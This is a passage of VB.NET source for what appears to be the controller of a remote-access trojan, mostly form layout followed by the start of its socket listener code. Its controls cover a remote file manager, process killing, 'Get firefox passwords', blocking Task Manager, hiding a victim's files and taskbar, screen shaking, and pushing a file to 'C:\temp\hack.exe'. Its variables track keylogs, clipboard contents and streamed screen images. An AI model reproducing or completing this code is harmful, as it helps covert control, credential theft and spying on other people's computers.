        Me.GroupBox15.Controls.Add(Me.Button82)
        Me.GroupBox15.Controls.Add(Me.Button81)
        Me.GroupBox15.Controls.Add(Me.Button58)
        Me.GroupBox15.Controls.Add(Me.Button80)
        Me.GroupBox15.Location = New System.Drawing.Point(489, 190)
        Me.GroupBox15.Name = "GroupBox15"
        Me.GroupBox15.Size = New System.Drawing.Size(77, 105)
        Me.GroupBox15.TabIndex = 16
        Me.GroupBox15.TabStop = False
        Me.GroupBox15.Text = "Quick nav"
        '
        'Button82
        '
        Me.Button82.Location = New System.Drawing.Point(0, 82)
        Me.Button82.Name = "Button82"
        Me.Button82.Size = New System.Drawing.Size(78, 21)
        Me.Button82.TabIndex = 14
        Me.Button82.Text = "Pictures"
        Me.Button82.UseVisualStyleBackColor = True
        '
        'Button81
        '
        Me.Button81.Location = New System.Drawing.Point(2, 61)
        Me.Button81.Name = "Button81"
        Me.Button81.Size = New System.Drawing.Size(76, 21)
        Me.Button81.TabIndex = 13
        Me.Button81.Text = "Music"
        Me.Button81.UseVisualStyleBackColor = True
        '
        'Button58
        '
        Me.Button58.Location = New System.Drawing.Point(2, 40)
        Me.Button58.Name = "Button58"
        Me.Button58.Size = New System.Drawing.Size(75, 21)
        Me.Button58.TabIndex = 12
        Me.Button58.Text = "Documents"
        Me.Button58.UseVisualStyleBackColor = True
        '
        'Button80
        '
        Me.Button80.Location = New System.Drawing.Point(0, 19)
        Me.Button80.Name = "Button80"
        Me.Button80.Size = New System.Drawing.Size(77, 21)
        Me.Button80.TabIndex = 11
        Me.Button80.Text = "Desktop"
        Me.Button80.UseVisualStyleBackColor = True
        '
        'Button71
        '
        Me.Button71.Enabled = False
        Me.Button71.Location = New System.Drawing.Point(191, 9)
        Me.Button71.Name = "Button71"
        Me.Button71.Size = New System.Drawing.Size(94, 21)
        Me.Button71.TabIndex = 15
        Me.Button71.Text = "Go Home"
        Me.Button71.UseVisualStyleBackColor = True
        '
        'ListBox5
        '
        Me.ListBox5.FormattingEnabled = True
        Me.ListBox5.Location = New System.Drawing.Point(373, 46)
        Me.ListBox5.Name = "ListBox5"
        Me.ListBox5.ScrollAlwaysVisible = True
        Me.ListBox5.Size = New System.Drawing.Size(110, 251)
        Me.ListBox5.TabIndex = 14
        '
        'ListBox4
        '
        Me.ListBox4.FormattingEnabled = True
        Me.ListBox4.Location = New System.Drawing.Point(1, 46)
        Me.ListBox4.Name = "ListBox4"
        Me.ListBox4.ScrollAlwaysVisible = True
        Me.ListBox4.Size = New System.Drawing.Size(184, 251)
        Me.ListBox4.TabIndex = 13
        '
        'Button75
        '
        Me.Button75.Location = New System.Drawing.Point(473, 3)
        Me.Button75.Name = "Button75"
        Me.Button75.Size = New System.Drawing.Size(94, 21)
        Me.Button75.TabIndex = 12
        Me.Button75.Text = "Download file"
        Me.Button75.UseVisualStyleBackColor = True
        '
        'TextBox14
        '
        Me.TextBox14.Location = New System.Drawing.Point(16, 10)
        Me.TextBox14.Name = "TextBox14"
        Me.TextBox14.Size = New System.Drawing.Size(169, 20)
        Me.TextBox14.TabIndex = 11
        Me.TextBox14.Text = "C:\"
        '
        'Button57
        '
        Me.Button57.Location = New System.Drawing.Point(500, 90)
        Me.Button57.Name = "Button57"
        Me.Button57.Size = New System.Drawing.Size(67, 21)
        Me.Button57.TabIndex = 9
        Me.Button57.Text = "Make file"
        Me.Button57.UseVisualStyleBackColor = True
        '
        'Button56
        '
        Me.Button56.Location = New System.Drawing.Point(500, 70)
        Me.Button56.Name = "Button56"
        Me.Button56.Size = New System.Drawing.Size(67, 21)
        Me.Button56.TabIndex = 8
        Me.Button56.Text = "Make dir"
        Me.Button56.UseVisualStyleBackColor = True
        '
        'Button55
        '
        Me.Button55.Location = New System.Drawing.Point(500, 50)
        Me.Button55.Name = "Button55"
        Me.Button55.Size = New System.Drawing.Size(67, 21)
        Me.Button55.TabIndex = 7
        Me.Button55.Text = "Delete file"
        Me.Button55.UseVisualStyleBackColor = True
        '
        'Button54
        '
        Me.Button54.Location = New System.Drawing.Point(500, 30)
        Me.Button54.Name = "Button54"
        Me.Button54.Size = New System.Drawing.Size(67, 21)
        Me.Button54.TabIndex = 6
        Me.Button54.Text = "Delete Dir"
        Me.Button54.UseVisualStyleBackColor = True
        '
        'Button43
        '
        Me.Button43.Enabled = False
        Me.Button43.Location = New System.Drawing.Point(328, 10)
        Me.Button43.Name = "Button43"
        Me.Button43.Size = New System.Drawing.Size(94, 21)
        Me.Button43.TabIndex = 5
        Me.Button43.Text = "Load dir + files"
        Me.Button43.UseVisualStyleBackColor = True
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Location = New System.Drawing.Point(4, 30)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(57, 13)
        Me.Label5.TabIndex = 2
        Me.Label5.Text = "Directories"
        '
        'ListBox2
        '
        Me.ListBox2.FormattingEnabled = True
        Me.ListBox2.Location = New System.Drawing.Point(191, 46)
        Me.ListBox2.Name = "ListBox2"
        Me.ListBox2.ScrollAlwaysVisible = True
        Me.ListBox2.Size = New System.Drawing.Size(176, 251)
        Me.ListBox2.TabIndex = 0
        '
        'TabPage8
        '
        Me.TabPage8.Controls.Add(Me.GroupBox22)
        Me.TabPage8.Controls.Add(Me.GroupBox21)
        Me.TabPage8.Controls.Add(Me.ListBox3)
        Me.TabPage8.Controls.Add(Me.Button45)
        Me.TabPage8.Controls.Add(Me.Button36)
        Me.TabPage8.Controls.Add(Me.TextBox8)
        Me.TabPage8.Controls.Add(Me.Button44)
        Me.TabPage8.Location = New System.Drawing.Point(4, 22)
        Me.TabPage8.Name = "TabPage8"
        Me.TabPage8.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage8.Size = New System.Drawing.Size(591, 303)
        Me.TabPage8.TabIndex = 7
        Me.TabPage8.Text = "Process manager"
        Me.TabPage8.UseVisualStyleBackColor = True
        '
        'Button91
        '
        Me.Button91.Location = New System.Drawing.Point(6, 38)
        Me.Button91.Name = "Button91"
        Me.Button91.Size = New System.Drawing.Size(157, 23)
        Me.Button91.TabIndex = 9
        Me.Button91.Text = "Open paint"
        Me.Button91.UseVisualStyleBackColor = True
        '
        'Button90
        '
        Me.Button90.Location = New System.Drawing.Point(6, 14)
        Me.Button90.Name = "Button90"
        Me.Button90.Size = New System.Drawing.Size(157, 22)
        Me.Button90.TabIndex = 8
        Me.Button90.Text = "Open notepad"
        Me.Button90.UseVisualStyleBackColor = True
        '
        'ListBox3
        '
        Me.ListBox3.FormattingEnabled = True
        Me.ListBox3.Location = New System.Drawing.Point(284, 12)
        Me.ListBox3.Name = "ListBox3"
        Me.ListBox3.Size = New System.Drawing.Size(277, 277)
        Me.ListBox3.TabIndex = 7
        '
        'Button45
        '
        Me.Button45.Location = New System.Drawing.Point(32, 217)
        Me.Button45.Name = "Button45"
        Me.Button45.Size = New System.Drawing.Size(65, 20)
        Me.Button45.TabIndex = 6
        Me.Button45.Text = "Start"
        Me.Button45.UseVisualStyleBackColor = True
        '
        'Button36
        '
        Me.Button36.Location = New System.Drawing.Point(208, 12)
        Me.Button36.Name = "Button36"
        Me.Button36.Size = New System.Drawing.Size(65, 20)
        Me.Button36.TabIndex = 5
        Me.Button36.Text = "Kill"
        Me.Button36.UseVisualStyleBackColor = True
        '
        'TextBox8
        '
        Me.TextBox8.Location = New System.Drawing.Point(32, 243)
        Me.TextBox8.Name = "TextBox8"
        Me.TextBox8.Size = New System.Drawing.Size(241, 20)
        Me.TextBox8.TabIndex = 4
        Me.TextBox8.Text = "explorer.exe"
        '
        'Button44
        '
        Me.Button44.Location = New System.Drawing.Point(6, 6)
        Me.Button44.Name = "Button44"
        Me.Button44.Size = New System.Drawing.Size(72, 20)
        Me.Button44.TabIndex = 0
        Me.Button44.Text = "Show"
        Me.Button44.UseVisualStyleBackColor = True
        '
        'TabPage9
        '
        Me.TabPage9.Controls.Add(Me.GroupBox20)
        Me.TabPage9.Controls.Add(Me.GroupBox19)
        Me.TabPage9.Controls.Add(Me.GroupBox16)
        Me.TabPage9.Controls.Add(Me.Button83)
        Me.TabPage9.Controls.Add(Me.GroupBox14)
        Me.TabPage9.Controls.Add(Me.GroupBox13)
        Me.TabPage9.Location = New System.Drawing.Point(4, 22)
        Me.TabPage9.Name = "TabPage9"
        Me.TabPage9.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage9.Size = New System.Drawing.Size(591, 303)
        Me.TabPage9.TabIndex = 8
        Me.TabPage9.Text = "More fun"
        Me.TabPage9.UseVisualStyleBackColor = True
        '
        'GroupBox19
        '
        Me.GroupBox19.Controls.Add(Me.btnFavourites)
        Me.GroupBox19.Controls.Add(Me.btnClock)
        Me.GroupBox19.Controls.Add(Me.btnContents)
        Me.GroupBox19.Controls.Add(Me.btnGroup)
        Me.GroupBox19.Controls.Add(Me.btnTop)
        Me.GroupBox19.Controls.Add(Me.btnAutoHide)
        Me.GroupBox19.Controls.Add(Me.btnLock)
        Me.GroupBox19.Location = New System.Drawing.Point(382, 0)
        Me.GroupBox19.Name = "GroupBox19"
        Me.GroupBox19.Size = New System.Drawing.Size(185, 189)
        Me.GroupBox19.TabIndex = 11
        Me.GroupBox19.TabStop = False
        Me.GroupBox19.Text = "Taskbar fun"
        '
        'btnFavourites
        '
        Me.btnFavourites.Location = New System.Drawing.Point(6, 157)
        Me.btnFavourites.Name = "btnFavourites"
        Me.btnFavourites.Size = New System.Drawing.Size(175, 23)
        Me.btnFavourites.TabIndex = 19
        Me.btnFavourites.Text = "Hide Favourites In Menu"
        Me.btnFavourites.UseVisualStyleBackColor = True
        '
        'btnClock
        '
        Me.btnClock.Location = New System.Drawing.Point(6, 135)
        Me.btnClock.Name = "btnClock"
        Me.btnClock.Size = New System.Drawing.Size(175, 23)
        Me.btnClock.TabIndex = 18
        Me.btnClock.Text = "Hide Clock"
        Me.btnClock.UseVisualStyleBackColor = True
        '
        'btnContents
        '
        Me.btnContents.Location = New System.Drawing.Point(6, 113)
        Me.btnContents.Name = "btnContents"
        Me.btnContents.Size = New System.Drawing.Size(175, 23)
        Me.btnContents.TabIndex = 17
        Me.btnContents.Text = "Hide Taskbar Contents"
        Me.btnContents.UseVisualStyleBackColor = True
        '
        'btnGroup
        '
        Me.btnGroup.Location = New System.Drawing.Point(6, 91)
        Me.btnGroup.Name = "btnGroup"
        Me.btnGroup.Size = New System.Drawing.Size(175, 23)
        Me.btnGroup.TabIndex = 16
        Me.btnGroup.Text = "Group Similar TaskBar Buttons"
        Me.btnGroup.UseVisualStyleBackColor = True
        '
        'btnTop
        '
        Me.btnTop.Location = New System.Drawing.Point(6, 69)
        Me.btnTop.Name = "btnTop"
        Me.btnTop.Size = New System.Drawing.Size(175, 23)
        Me.btnTop.TabIndex = 15
        Me.btnTop.Text = "Keep TaskBar on Top"
        Me.btnTop.UseVisualStyleBackColor = True
        '
        'btnAutoHide
        '
        Me.btnAutoHide.Location = New System.Drawing.Point(7, 47)
        Me.btnAutoHide.Name = "btnAutoHide"
        Me.btnAutoHide.Size = New System.Drawing.Size(175, 23)
        Me.btnAutoHide.TabIndex = 14
        Me.btnAutoHide.Text = "Auto Hide TaskBar"
        Me.btnAutoHide.UseVisualStyleBackColor = True
        '
        'btnLock
        '
        Me.btnLock.Location = New System.Drawing.Point(7, 25)
        Me.btnLock.Name = "btnLock"
        Me.btnLock.Size = New System.Drawing.Size(175, 23)
        Me.btnLock.TabIndex = 13
        Me.btnLock.Text = "Lock TaskBar"
        Me.btnLock.UseVisualStyleBackColor = True
        '
        'GroupBox16
        '
        Me.GroupBox16.Controls.Add(Me.Button87)
        Me.GroupBox16.Controls.Add(Me.Button86)
        Me.GroupBox16.Location = New System.Drawing.Point(262, 15)
        Me.GroupBox16.Name = "GroupBox16"
        Me.GroupBox16.Size = New System.Drawing.Size(108, 68)
        Me.GroupBox16.TabIndex = 9
        Me.GroupBox16.TabStop = False
        Me.GroupBox16.Text = "Screen shake"
        '
        'Button87
        '
        Me.Button87.Enabled = False
        Me.Button87.Location = New System.Drawing.Point(6, 17)
        Me.Button87.Name = "Button87"
        Me.Button87.Size = New System.Drawing.Size(92, 21)
        Me.Button87.TabIndex = 8
        Me.Button87.Text = "Shake screen"
        Me.Button87.UseVisualStyleBackColor = True
        '
        'Button86
        '
        Me.Button86.Enabled = False
        Me.Button86.Location = New System.Drawing.Point(6, 41)
        Me.Button86.Name = "Button86"
        Me.Button86.Size = New System.Drawing.Size(92, 21)
        Me.Button86.TabIndex = 7
        Me.Button86.Text = "Stop shake"
        Me.Button86.UseVisualStyleBackColor = True
        '
        'Button83
        '
        Me.Button83.Enabled = False
        Me.Button83.Location = New System.Drawing.Point(278, 89)
        Me.Button83.Name = "Button83"
        Me.Button83.Size = New System.Drawing.Size(92, 45)
        Me.Button83.TabIndex = 4
        Me.Button83.Text = "Get firefox passwords"
        Me.Button83.UseVisualStyleBackColor = True
        '
        'GroupBox14
        '
        Me.GroupBox14.Controls.Add(Me.Button78)
        Me.GroupBox14.Controls.Add(Me.Button85)
        Me.GroupBox14.Controls.Add(Me.Button84)
        Me.GroupBox14.Controls.Add(Me.Button79)
        Me.GroupBox14.Controls.Add(Me.Button76)
        Me.GroupBox14.Controls.Add(Me.Button77)
        Me.GroupBox14.Location = New System.Drawing.Point(124, 14)
        Me.GroupBox14.Name = "GroupBox14"
        Me.GroupBox14.Size = New System.Drawing.Size(132, 283)
        Me.GroupBox14.TabIndex = 3
        Me.GroupBox14.TabStop = False
        Me.GroupBox14.Text = "Show / hide files"
        '
        'Button78
        '
        Me.Button78.Enabled = False
        Me.Button78.Location = New System.Drawing.Point(6, 71)
        Me.Button78.Name = "Button78"
        Me.Button78.Size = New System.Drawing.Size(123, 48)
        Me.Button78.TabIndex = 3
        Me.Button78.Text = "Hide : My Documents" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "           My Music" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "           My Images" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10)
        Me.Button78.UseVisualStyleBackColor = True
        '
        'Button85
        '
        Me.Button85.Location = New System.Drawing.Point(6, 228)
        Me.Button85.Name = "Button85"
        Me.Button85.Size = New System.Drawing.Size(120, 49)
        Me.Button85.TabIndex = 6
        Me.Button85.Text = "Show Taskbar icons and open file windows"
        Me.Button85.UseVisualStyleBackColor = True
        '
        'Button84
        '
        Me.Button84.Location = New System.Drawing.Point(6, 180)
        Me.Button84.Name = "Button84"
        Me.Button84.Size = New System.Drawing.Size(120, 42)
        Me.Button84.TabIndex = 5
        Me.Button84.Text = "Hide Taskbar icons and open file windows"
        Me.Button84.UseVisualStyleBackColor = True
        '
        'Button79
        '
        Me.Button79.Enabled = False
        Me.Button79.Location = New System.Drawing.Point(6, 125)
        Me.Button79.Name = "Button79"
        Me.Button79.Size = New System.Drawing.Size(123, 50)
        Me.Button79.TabIndex = 4
        Me.Button79.Text = "Show : My Documents" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "            My Music" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "            My Images" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10)
        Me.Button79.UseVisualStyleBackColor = True
        '
        'Button76
        '
        Me.Button76.Enabled = False
        Me.Button76.Location = New System.Drawing.Point(6, 19)
        Me.Button76.Name = "Button76"
        Me.Button76.Size = New System.Drawing.Size(123, 23)
        Me.Button76.TabIndex = 1
        Me.Button76.Text = "Hide desktop files"
        Me.Button76.UseVisualStyleBackColor = True
        '
        'Button77
        '
        Me.Button77.Enabled = False
        Me.Button77.Location = New System.Drawing.Point(6, 46)
        Me.Button77.Name = "Button77"
        Me.Button77.Size = New System.Drawing.Size(123, 23)
        Me.Button77.TabIndex = 2
        Me.Button77.Text = "Show desktop files"
        Me.Button77.UseVisualStyleBackColor = True
        '
        'GroupBox13
        '
        Me.GroupBox13.Controls.Add(Me.Button73)
        Me.GroupBox13.Controls.Add(Me.Button72)
        Me.GroupBox13.Controls.Add(Me.Button69)
        Me.GroupBox13.Controls.Add(Me.Button67)
        Me.GroupBox13.Controls.Add(Me.Button66)
        Me.GroupBox13.Controls.Add(Me.Button68)
        Me.GroupBox13.Controls.Add(Me.Button65)
        Me.GroupBox13.Controls.Add(Me.Button64)
        Me.GroupBox13.Location = New System.Drawing.Point(12, 14)
        Me.GroupBox13.Name = "GroupBox13"
        Me.GroupBox13.Size = New System.Drawing.Size(106, 225)
        Me.GroupBox13.TabIndex = 0
        Me.GroupBox13.TabStop = False
        Me.GroupBox13.Text = "Resolution"
        '
        'Button73
        '
        Me.Button73.Enabled = False
        Me.Button73.Location = New System.Drawing.Point(13, 194)
        Me.Button73.Name = "Button73"
        Me.Button73.Size = New System.Drawing.Size(77, 22)
        Me.Button73.TabIndex = 8
        Me.Button73.Text = "800 X 600"
        Me.Button73.UseVisualStyleBackColor = True
        '
        'Button72
        '
        Me.Button72.Enabled = False
        Me.Button72.Location = New System.Drawing.Point(13, 166)
        Me.Button72.Name = "Button72"
        Me.Button72.Size = New System.Drawing.Size(77, 22)
        Me.Button72.TabIndex = 7
        Me.Button72.Text = "1024 X 600"
        Me.Button72.UseVisualStyleBackColor = True
        '
        'Button69
        '
        Me.Button69.Enabled = False
        Me.Button69.Location = New System.Drawing.Point(13, 63)
        Me.Button69.Name = "Button69"
        Me.Button69.Size = New System.Drawing.Size(77, 19)
        Me.Button69.TabIndex = 5
        Me.Button69.Text = "1280 X 768"
        Me.Button69.UseVisualStyleBackColor = True
        '
        'Button67
        '
        Me.Button67.Enabled = False
        Me.Button67.Location = New System.Drawing.Point(13, 138)
        Me.Button67.Name = "Button67"
        Me.Button67.Size = New System.Drawing.Size(77, 22)
        Me.Button67.TabIndex = 3
        Me.Button67.Text = "1024 X 768"
        Me.Button67.UseVisualStyleBackColor = True
        '
        'Button66
        '
        Me.Button66.Enabled = False
        Me.Button66.Location = New System.Drawing.Point(13, 88)
        Me.Button66.Name = "Button66"
        Me.Button66.Size = New System.Drawing.Size(77, 19)
        Me.Button66.TabIndex = 2
        Me.Button66.Text = "1280 X 720"
        Me.Button66.UseVisualStyleBackColor = True
        '
        'Button68
        '
        Me.Button68.Enabled = False
        Me.Button68.Location = New System.Drawing.Point(13, 113)
        Me.Button68.Name = "Button68"
        Me.Button68.Size = New System.Drawing.Size(77, 19)
        Me.Button68.TabIndex = 4
        Me.Button68.Text = "1280 X 600"
        Me.Button68.UseVisualStyleBackColor = True
        '
        'Button65
        '
        Me.Button65.Enabled = False
        Me.Button65.Location = New System.Drawing.Point(13, 37)
        Me.Button65.Name = "Button65"
        Me.Button65.Size = New System.Drawing.Size(77, 20)
        Me.Button65.TabIndex = 1
        Me.Button65.Text = "1360 X 768"
        Me.Button65.UseVisualStyleBackColor = True
        '
        'Button64
        '
        Me.Button64.Enabled = False
        Me.Button64.Location = New System.Drawing.Point(13, 12)
        Me.Button64.Name = "Button64"
        Me.Button64.Size = New System.Drawing.Size(77, 19)
        Me.Button64.TabIndex = 0
        Me.Button64.Text = "1366 X 768"
        Me.Button64.UseVisualStyleBackColor = True
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        Me.Timer1.Interval = 500
        '
        'Button88
        '
        Me.Button88.Location = New System.Drawing.Point(390, 468)
        Me.Button88.Name = "Button88"
        Me.Button88.Size = New System.Drawing.Size(98, 28)
        Me.Button88.TabIndex = 14
        Me.Button88.Text = "Debug"
        Me.Button88.UseVisualStyleBackColor = True
        '
        'GroupBox20
        '
        Me.GroupBox20.Controls.Add(Me.Button92)
        Me.GroupBox20.Controls.Add(Me.TextBox17)
        Me.GroupBox20.Controls.Add(Me.Label15)
        Me.GroupBox20.Location = New System.Drawing.Point(278, 194)
        Me.GroupBox20.Name = "GroupBox20"
        Me.GroupBox20.Size = New System.Drawing.Size(279, 58)
        Me.GroupBox20.TabIndex = 12
        Me.GroupBox20.TabStop = False
        Me.GroupBox20.Text = "Change desktop background"
        '
        'Button92
        '
        Me.Button92.Enabled = False
        Me.Button92.Location = New System.Drawing.Point(210, 26)
        Me.Button92.Name = "Button92"
        Me.Button92.Size = New System.Drawing.Size(52, 24)
        Me.Button92.TabIndex = 4
        Me.Button92.Text = "GO!"
        Me.Button92.UseVisualStyleBackColor = True
        '
        'TextBox17
        '
        Me.TextBox17.Location = New System.Drawing.Point(15, 30)
        Me.TextBox17.Name = "TextBox17"
        Me.TextBox17.Size = New System.Drawing.Size(180, 20)
        Me.TextBox17.TabIndex = 2
        Me.TextBox17.Text = "http://site.com/fake.jpg"
        '
        'Label15
        '
        Me.Label15.AutoSize = True
        Me.Label15.Location = New System.Drawing.Point(12, 17)
        Me.Label15.Name = "Label15"
        Me.Label15.Size = New System.Drawing.Size(29, 13)
        Me.Label15.TabIndex = 0
        Me.Label15.Text = "URL"
        '
        'TabPage10
        '
        Me.TabPage10.Controls.Add(Me.GroupBox18)
        Me.TabPage10.Location = New System.Drawing.Point(4, 22)
        Me.TabPage10.Name = "TabPage10"
        Me.TabPage10.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage10.Size = New System.Drawing.Size(591, 303)
        Me.TabPage10.TabIndex = 9
        Me.TabPage10.Text = "Misc"
        Me.TabPage10.UseVisualStyleBackColor = True
        '
        'GroupBox18
        '
        Me.GroupBox18.Controls.Add(Me.Button89)
        Me.GroupBox18.Controls.Add(Me.TextBox15)
        Me.GroupBox18.Controls.Add(Me.TextBox7)
        Me.GroupBox18.Controls.Add(Me.Label11)
        Me.GroupBox18.Controls.Add(Me.Label10)
        Me.GroupBox18.Location = New System.Drawing.Point(6, 6)
        Me.GroupBox18.Name = "GroupBox18"
        Me.GroupBox18.Size = New System.Drawing.Size(279, 139)
        Me.GroupBox18.TabIndex = 11
        Me.GroupBox18.TabStop = False
        Me.GroupBox18.Text = "File to server"
        '
        'Button89
        '
        Me.Button89.Enabled = False
        Me.Button89.Location = New System.Drawing.Point(101, 109)
        Me.Button89.Name = "Button89"
        Me.Button89.Size = New System.Drawing.Size(52, 24)
        Me.Button89.TabIndex = 4
        Me.Button89.Text = "GO!"
        Me.Button89.UseVisualStyleBackColor = True
        '
        'TextBox15
        '
        Me.TextBox15.Location = New System.Drawing.Point(15, 79)
        Me.TextBox15.Name = "TextBox15"
        Me.TextBox15.Size = New System.Drawing.Size(224, 20)
        Me.TextBox15.TabIndex = 3
        Me.TextBox15.Text = "C:\temp\hack.exe"
        '
        'TextBox7
        '
        Me.TextBox7.Location = New System.Drawing.Point(15, 32)
        Me.TextBox7.Name = "TextBox7"
        Me.TextBox7.Size = New System.Drawing.Size(224, 20)
        Me.TextBox7.TabIndex = 2
        Me.TextBox7.Text = "http://site.com/fake.jpg"
        '
        'Label11
        '
        Me.Label11.AutoSize = True
        Me.Label11.Location = New System.Drawing.Point(12, 63)
        Me.Label11.Name = "Label11"
        Me.Label11.Size = New System.Drawing.Size(76, 13)
        Me.Label11.TabIndex = 1
        Me.Label11.Text = "Path on server"
        '
        'Label10
        '
        Me.Label10.AutoSize = True
        Me.Label10.Location = New System.Drawing.Point(12, 17)
        Me.Label10.Name = "Label10"
        Me.Label10.Size = New System.Drawing.Size(29, 13)
        Me.Label10.TabIndex = 0
        Me.Label10.Text = "URL"
        '
        'Button93
        '
        Me.Button93.Location = New System.Drawing.Point(8, 19)
        Me.Button93.Name = "Button93"
        Me.Button93.Size = New System.Drawing.Size(157, 23)
        Me.Button93.TabIndex = 10
        Me.Button93.Text = "block task manger"
        Me.Button93.UseVisualStyleBackColor = True
        '
        'Button94
        '
        Me.Button94.Location = New System.Drawing.Point(6, 48)
        Me.Button94.Name = "Button94"
        Me.Button94.Size = New System.Drawing.Size(157, 23)
        Me.Button94.TabIndex = 11
        Me.Button94.Text = "unblock task manger"
        Me.Button94.UseVisualStyleBackColor = True
        '
        'GroupBox21
        '
        Me.GroupBox21.Controls.Add(Me.Button95)
        Me.GroupBox21.Controls.Add(Me.Button91)
        Me.GroupBox21.Controls.Add(Me.Button90)
        Me.GroupBox21.Location = New System.Drawing.Point(17, 32)
        Me.GroupBox21.Name = "GroupBox21"
        Me.GroupBox21.Size = New System.Drawing.Size(171, 90)
        Me.GroupBox21.TabIndex = 12
        Me.GroupBox21.TabStop = False
        Me.GroupBox21.Text = "Open programs"
        '
        'GroupBox22
        '
        Me.GroupBox22.Controls.Add(Me.Button93)
        Me.GroupBox22.Controls.Add(Me.Button94)
        Me.GroupBox22.Location = New System.Drawing.Point(17, 128)
        Me.GroupBox22.Name = "GroupBox22"
        Me.GroupBox22.Size = New System.Drawing.Size(171, 77)
        Me.GroupBox22.TabIndex = 13
        Me.GroupBox22.TabStop = False
        Me.GroupBox22.Text = "Task manager"
        '
        'Button95
        '
        Me.Button95.Location = New System.Drawing.Point(6, 61)
        Me.Button95.Name = "Button95"
        Me.Button95.Size = New System.Drawing.Size(157, 23)
        Me.Button95.TabIndex = 10
        Me.Button95.Text = "Open calculator"
        Me.Button95.UseVisualStyleBackColor = True
        '
        'Form1
        '
        Me.AutoScaleBaseSize = New System.Drawing.Size(5, 13)
        Me.ClientSize = New System.Drawing.Size(605, 500)
        Me.ContextMenu = Me.ContextMenu1
        Me.Controls.Add(Me.Button88)
        Me.Controls.Add(Me.TabControl1)
        Me.Controls.Add(Me.Label2)
        Me.Controls.Add(Me.ListBox1)
        Me.Controls.Add(Me.Label1)
        Me.Controls.Add(Me.rt)
        Me.Name = "Form1"
        Me.Text = "Client"
        Me.TabControl1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.GroupBox17.ResumeLayout(False)
        Me.GroupBox17.PerformLayout()
        Me.GroupBox11.ResumeLayout(False)
        Me.GroupBox10.ResumeLayout(False)
        Me.GroupBox10.PerformLayout()
        Me.GroupBox8.ResumeLayout(False)
        Me.GroupBox8.PerformLayout()
        Me.GroupBox5.ResumeLayout(False)
        Me.GroupBox12.ResumeLayout(False)
        Me.GroupBox12.PerformLayout()
        Me.GroupBox9.ResumeLayout(False)
        Me.GroupBox9.PerformLayout()
        Me.GroupBox7.ResumeLayout(False)
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox4.ResumeLayout(False)
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage2.PerformLayout()
        Me.TabPage3.ResumeLayout(False)
        Me.TabPage3.PerformLayout()
        Me.GroupBox6.ResumeLayout(False)
        Me.GroupBox6.PerformLayout()
        Me.TabPage4.ResumeLayout(False)
        Me.TabPage4.PerformLayout()
        Me.TabPage5.ResumeLayout(False)
        Me.TabPage5.PerformLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage6.ResumeLayout(False)
        Me.TabPage6.PerformLayout()
        Me.TabPage7.ResumeLayout(False)
        Me.TabPage7.PerformLayout()
        Me.GroupBox15.ResumeLayout(False)
        Me.TabPage8.ResumeLayout(False)
        Me.TabPage8.PerformLayout()
        Me.TabPage9.ResumeLayout(False)
        Me.GroupBox19.ResumeLayout(False)
        Me.GroupBox16.ResumeLayout(False)
        Me.GroupBox14.ResumeLayout(False)
        Me.GroupBox13.ResumeLayout(False)
        Me.GroupBox20.ResumeLayout(False)
        Me.GroupBox20.PerformLayout()
        Me.TabPage10.ResumeLayout(False)
        Me.GroupBox18.ResumeLayout(False)
        Me.GroupBox18.PerformLayout()
        Me.GroupBox21.ResumeLayout(False)
        Me.GroupBox22.ResumeLayout(False)
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

#End Region

    '  Public w1 As New MSWinsockLib.Winsock
    '----------------------------------------
    '---socket stuff-----------------------

    Dim serversocket As New TcpClient()
    Dim tcpcin As New TcpListener(8001)
    'sends on 8000
    'recieves on 8001
    Public Event myevent(ByVal str As String)
    Delegate Sub setcallback(ByVal txt As String)

    Dim maip As System.Net.IPHostEntry = System.Net.Dns.GetHostByName(System.Net.Dns.GetHostName)

    '-----------------------------




    Dim live As Boolean = False
    Dim info As Boolean = False
    Dim proc As Boolean = False
    Dim clipb As Boolean = False
    Dim chatr As Boolean = False
    Dim rawimage As Boolean = False
    Dim filem As Boolean = False
    Dim nick As Object


    Dim cmd As String = ""
    Dim inf0 As String = ""
    Dim keylog As String = ""


    Dim mReader As BinaryReader
    Dim mWriter As BinaryWriter = Nothing
    Const ListenPort As Int16 = 81
    Const RequestPort As Int16 = 82
    Shared NoofClients As Int16 = 0 'Stores the Number of Image Sender Connected




    Dim mReader2 As BinaryReader
    Dim mWriter2 As BinaryWriter = Nothing
    Const ListenPort2 As Int16 = 83
    Const RequestPort2 As Int16 = 84
    Shared NoofClients2 As Int16 = 0 'Stores the Number of Image Sender Connected


    Dim sock As New TcpClient()
    Dim ip As IPAddress = IPAddress.Parse("127.0.0.1")
    Dim tcpport As Integer = 69



    Dim myip As System.Net.IPHostEntry = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName)

    Private Sub myevent_log(ByVal str As String) Handles Me.myevent
        ListBox1.Items.Add(str)
    End Sub



    Sub ListenAlways()

        'Listen 4 InComming Connections
        Dim MyListener As TcpListener
        'Dim MyIp As IPAddress = Dns.GetHostAddresses("localhost")(0)
        'MyListener = New TcpListener(MyIp, ListenPort)

        MyListener = New TcpListener(IPAddress.Any, ListenPort)
        MyListener.Start()


        Try
            While (True)

                Application.DoEvents()

                Dim TempClient As TcpClient = MyListener.AcceptTcpClient
                'Accept the Client

                NoofClients += 1

